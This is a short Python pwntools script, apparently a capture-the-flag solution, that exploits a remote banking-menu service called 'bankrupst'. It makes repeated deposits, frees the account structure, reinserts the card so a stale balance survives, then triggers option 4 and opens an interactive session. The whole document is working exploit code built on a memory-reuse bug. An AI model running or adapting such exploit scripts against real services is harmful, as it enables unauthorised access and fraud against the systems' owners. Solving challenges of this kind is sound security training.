#!/usr/bin/env python3

from pwn import *

io = remote('bankrupst.serviel.fr', 1234, ssl=True)

# Insert BankRupst card
io.sendlineafter(b'option: ', b'1')

# Do maximum deposits
for i in range(13):
    io.sendlineafter(b'option: ', b'2')
    io.sendlineafter(b'deposit? ', b'100')

# dealloc BankAccount structure
io.sendlineafter(b'option: ', b'6')

# balance attribute isn't set to 0
io.sendlineafter(b'option: ', b'1')

io.sendlineafter(b'option: ', b'2')
io.sendlineafter(b'deposit? ', b'100')

io.sendlineafter(b'option: ', b'4')

io.interactive()